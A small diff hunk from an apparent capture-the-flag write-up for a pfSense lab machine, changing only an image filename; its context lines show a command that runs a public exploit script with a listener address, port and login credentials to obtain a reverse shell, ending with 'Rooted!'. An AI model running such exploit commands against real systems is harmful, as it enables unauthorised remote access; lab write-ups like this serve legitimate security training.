@@ -83,6 +83,6 @@ We can download this exploit and use it to get a reverse shell.
 python3 43560.py --rhost 10.129.85.96 --lhost 10.10.14.13 --lport 4444 --username rohit --password pfsense
 ```
 
-<figure><img src="../../../.gitbook/assets/image (32) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (32) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!&#x20;
